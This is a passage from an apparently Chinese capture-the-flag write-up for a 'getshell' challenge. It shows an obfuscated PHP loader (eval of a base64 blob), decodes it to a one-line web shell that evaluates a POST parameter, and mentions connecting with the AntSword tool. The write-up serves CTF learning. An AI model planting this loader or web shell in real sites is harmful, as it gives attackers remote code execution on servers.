$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">18</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">1</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">7</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">13</span>&#125;;</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">22</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">36</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">29</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">32</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">35</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC(<span class="string">&quot;JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们解出后，得到一段php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用蚁剑进行连接<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234659.png" alt=""><br>
